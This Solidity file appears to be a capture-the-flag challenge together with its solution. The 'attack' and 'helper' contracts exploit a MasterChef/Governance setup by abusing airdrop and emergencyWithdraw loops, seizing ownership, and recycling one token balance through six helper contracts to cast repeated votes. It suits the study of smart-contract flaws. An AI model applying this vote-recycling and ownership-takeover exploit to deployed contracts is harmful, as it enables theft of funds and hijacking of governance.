// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.6.12;

import "./interface.sol";
import "./Masterchef.sol";

contract Governance {
    bool public Flag;
    address public  ValidatorOwner;
    mapping (address => uint256) public validatorVotes;
    mapping (address => bool) public VotingStatus;
    event Sendflag(bool Flag);
    MasterChef public masterChef = new MasterChef();
    string greeting;
    constructor (string memory _greeting) public {
        greeting = _greeting;
    }
    modifier onlyValidatorOwner() {
        require(msg.sender == ValidatorOwner, "Governance: only validator owner");
        _;
    }
    function vote(address validator) public {
        require(masterChef.owner() == msg.sender);
        require(!VotingStatus[msg.sender]);
        VotingStatus[msg.sender] = true;
        uint balances = masterChef.balanceOf(msg.sender);
        validatorVotes[validator] += balances;
    }
    function setValidator() public {
        uint256 votingSupply = masterChef.totalSupply() * 2 / 3;
        require(validatorVotes[msg.sender] >= votingSupply);
        ValidatorOwner = msg.sender;
    }

    function setflag() public onlyValidatorOwner {
        Flag = true;
        emit Sendflag(Flag);
    }
}
contract attack{
    MasterChef master;
    Governance gover;
    address[6]  helpers;
    address public owner;
    constructor(address _master,address _gover)public{
        master = MasterChef(_master);
        gover = Governance(_gover);
        owner = msg.sender;
    }
    function getAir()public{
        for (uint i=0;i<1000;i++){
            master.airdorp();
        }
    }
    function getOwner()public{
        master.transferOwnership(address(this));
    }
    function vode()public{
        gover.vote(owner);
    }
    function setHelpers()public{
        for(uint i=0;i<helpers.length;i++){
            helpers[i]=address(new helper(address(master),address(gover)));
        }
    }
    function getBalance()public{
        for(uint i=0;i<1000;i++){
            master.emergencyWithdraw(0);
        }
        
    }
    function transferd()public{
        master.approve(address(master),master.balanceOf(address(this)));
        master.deposit(0,master.balanceOf(address(this)));
    }
    function getVote()public{
        master.transfer(helpers[0],10000000);
        helper(helpers[0]).getOwner();
        helper(helpers[0]).vode(owner);
        for (uint i=0;i<helpers.length-1;i++){
            helper(helpers[i]).transferd(helpers[i+1]);
            helper(helpers[i+1]).getOwner();
            helper(helpers[i+1]).vode(owner);
        }
        helper(helpers[5]).transferd(address(this));
    }
}
contract helper{
    MasterChef master;
    Governance gover;
    constructor(address _master,address _gover)public{
        master = MasterChef(_master);
        gover = Governance(_gover);
    }
    function getOwner()public{
        master.transferOwnership(address(this));
    }
    function vode(address _addr)public{
        gover.vote(_addr);
    }
    function transferd(address _addr)public{
        master.transfer(_addr,10000000);
    }
}